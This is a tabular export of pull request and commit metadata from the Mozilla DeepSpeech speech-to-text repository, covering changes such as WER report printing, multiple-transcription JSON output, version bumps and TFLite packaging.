1404,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ec88b7f28334672b9be8f91fa2b0d6cf6b5b995,Add whitespace again.
1405,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5145526f0690fd24728a4353a6530b1a56eb4b2,Dont need flags.
1406,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4186cbef883400b6d6c30ec64284454a1232f938,Reverse ordered loss again.
1407,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de92142986804ec781a8ad053095c7728f4318be,Named example sections.
1408,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cc91fafb23178f73e15a2458ac66ddbb21e2fb9,Moved summary printing to samples printing.
1409,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2724,2724,Print best and worst results in a WER report.,This is also correcting the error that the results with the highest WER instead of the lowest WER are printed.,DanBmh,18572490,2020-02-05T16:57:26Z,CONTRIBUTOR,True,57,37,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,726cc20586e2f8afc0b87f5ee84afc941e70d2d6,Rename dataset param.
1410,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2723,2723,Sample DBs,,tilmankamp,5991088,2020-02-05T15:34:57Z,CONTRIBUTOR,True,916,91,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b1d6773de25aaf1c1c157f8c11ecdd727f00c6d,SDB support
1411,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2721,2721,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-05T07:59:28Z,COLLABORATOR,False,138,49,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,093cd2a5afa1e79e15c97d6c3476cdac9de843c2,Expose multiple transcriptions through the API
1412,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2721,2721,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-05T07:59:28Z,COLLABORATOR,False,138,49,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc4ad0e83cab6e48969484074a56c8de1ae3cebb,Client changes to show multiple transcriptions in JSON output
1413,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2721,2721,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-05T07:59:28Z,COLLABORATOR,False,138,49,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1cd2b9e48cb93012c2ce15efa5f66d390f687984,Changed variable names to match coding style
1414,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2721,2721,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-05T07:59:28Z,COLLABORATOR,False,138,49,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4daf3bfbbedbc9bf29ff17ac56c6dd77412576c,Moved result limiting to ModelState instead of CTC decoder
1415,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2721,2721,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-05T07:59:28Z,COLLABORATOR,False,138,49,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41bbd4cb933074aecf491fa69a8d9a3f645fdf0b,"Client - Change JSON output to return alternatives transcripts in an ""alternatives"" array"
1416,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2720,2720,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-04T23:46:27Z,COLLABORATOR,False,136,52,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fedea3d31273f3b2af026d93e0dcbab90c628b5,Expose multiple transcriptions through the API
1417,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2720,2720,Expose multiple transcriptions,"Sample output:

```
[
{""metadata"":{""confidence"":-87.0209},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""affile"",""time"":3.42,""duration"":0.36}]},
{""metadata"":{""confidence"":-74.4723},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""events"",""time"":1.42,""duration"":0.56},{""word"":""like"",""time"":2.06,""duration"":0.68},{""word"":""approving"",""time"":2.74,""duration"":0.58},{""word"":""a"",""time"":3.42,""duration"":0.0400002},{""word"":""file"",""time"":3.48,""duration"":0.3}]},
{""metadata"":{""confidence"":-89.3516},""words"":[{""word"":""remark"",""time"":0,""duration"":0.56},{""word"":""in"",""time"":0.58,""duration"":0.14},{""word"":""response"",""time"":0.72,""duration"":0.56},{""word"":""to"",""time"":1.3,""duration"":0.12},{""word"":""a"",""time"":1.42,""duration"":0.02},{""word"":""vent"",""time"":1.58,""duration"":0.4},{""word"":""like"",""time"":2.06,""duration"":0.7},{""word"":""approving"",""time"":2.76,""duration"":0.56},{""word"":""affile"",""time"":3.42,""duration"":0.38}]}
]
```

Some notes:

1. Maybe Result isn't the best name for the struct but I wasn't really sure of the most suitable name to refer to it. Suggestions are welcome.

2. I chose to output from the client as a JSON array. But is it obvious that the top result is the ""best"" one? An alternative way to organize it would be:

```
{
""confidence"": 1.0, 
""words"": [{""word"": ""x"", ""time"": 0}], 
""alternatives"": [{""confidence"": 0.9, ""words"":[{""word"": ""y"", ""time"": 0}]},...] 
}
```

This would be closer to how Google's STT API works.

3. I hard-coded the client to output 3 transcriptions, which seemed reasonable. It is of course configurable to anyone using the API but I don't know if offering a command-line option to customize this in the client is worthwhile. Open to feedback on this.

Fixes #432 ",dabinat,18251622,2020-02-04T23:46:27Z,COLLABORATOR,False,136,52,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,63b3bcb6e521a5f65e3c8fd0005a2ea638a49ae4,Client changes to show multiple transcriptions in JSON output
1418,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2719,2719,Ensure documentation mentions python3-dev,Fixes #2712,lissyx,1645737,2020-02-04T17:19:25Z,COLLABORATOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00d11e2feccd321f343fa003e00d3d759e179c7f,"Ensure documentation mentions python3-dev

Fixes #2712"
1419,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2714,2714,Bump VERSION to 0.7.0-alpha.1,,lissyx,1645737,2020-02-03T13:53:47Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd982b2224f8f864f808db3665e60ed7070f3dce,Bump VERSION to 0.7.0-alpha.1
1420,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2711,2711,Enforce CTC decoder version check,Fix #2710,lissyx,1645737,2020-01-31T22:45:05Z,COLLABORATOR,True,55,6,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff401732a394b273e0e7d87fa190b9aa02b4e83b,"Enforce CTC decoder version check

Fix #2710"
1421,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2708,2708,Bump VERSION to 0.7.0-alpha.0,,lissyx,1645737,2020-01-31T11:03:05Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e452dcd0b9e2069a05418d6094c32c538bde758,Bump VERSION to 0.7.0-alpha.0
1422,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2706,2706,Produce TFLite NuGet package,,lissyx,1645737,2020-01-30T09:21:57Z,COLLABORATOR,True,58,15,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f9869fb008e03221867d288a07d7dff54dfdbdb,Produce TFLite NuGet package
1423,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2705,2705,Produce TFLite-specific NPM package,,lissyx,1645737,2020-01-30T09:06:28Z,COLLABORATOR,True,104,11,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e521ff3a2fdb46bc0004e634bcef06cc9fb3b4e,Produce TFLite-specific NPM package
1424,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2704,2704,Remove unused benchmark_nc,,lissyx,1645737,2020-01-30T07:48:50Z,COLLABORATOR,True,0,774,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc255099507a8e72f35227f10ba94a1257905077,Remove unused benchmark_nc
1425,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2703,2703,Transfer learning tc,,lissyx,1645737,2020-01-29T18:53:36Z,COLLABORATOR,False,272,68,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04007ac77672bb14f26365dd7a1db066dd3ceb48,Transfer-learning patch from a nice clean branch
1426,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2703,2703,Transfer learning tc,,lissyx,1645737,2020-01-29T18:53:36Z,COLLABORATOR,False,272,68,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5335a86ccebbcc3c2554c28986fe8d1d6ac485ab,fix whitespace nits
1427,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2703,2703,Transfer learning tc,,lissyx,1645737,2020-01-29T18:53:36Z,COLLABORATOR,False,272,68,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f858a2a588c974ea7ae5331698cf806c977382c,"WIP -- Refactoring try_loading()

X-DEEPSPEECH: NOBUILD"
1428,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2703,2703,Transfer learning tc,,lissyx,1645737,2020-01-29T18:53:36Z,COLLABORATOR,False,272,68,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c49239114d1d9d7f52b1a4c7c8f86da6818f8ea8,Fix bogus string doc
1429,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2703,2703,Transfer learning tc,,lissyx,1645737,2020-01-29T18:53:36Z,COLLABORATOR,False,272,68,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bfe55e1feb5d433ceb51e7c788ef7175465cdb0,Add TaskCluster CI for Transfer Learning
1430,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e69ec9859cf8f25307109d38256031df1e1e451c,Update KenLM to b9f35777d112ce2fc10bd3986302517a16dc3883
1431,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3f1d86d133d6a3c40514a351a11d5f33d9fd829,Stop including vocabulary data in LM.binary.
1432,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c6b021e77095702daf4b268e674905be66886dc,Refactor Scorer so model/trie package can be created by an external tool
1433,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,183b11ad29b4b398ca7494cf2ffbb19ac8a91a9a,Add generate_package tool to create combined scorer package
1434,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,87cf7c9029b83c487e86c8b2dfd2ed4792d25c2a,Load combined format from Scorer
1435,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2702,2702,Embed beam width in exported model and move parameter out of CreateModel,"Continuing the theme of having defaults and optionally overriding them, this moves the beam width parameter out of CreateModel. This PR has #2681 as its base since it's built on top of that. It needs to wait until that merges and then the base can be set to master.",reuben,477142,2020-01-29T10:36:27Z,MEMBER,False,5002,1019,108,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e507f2466860a1a60881412a3c1b5a5a890ef2e6,Write default values for alpha and beta into trie header
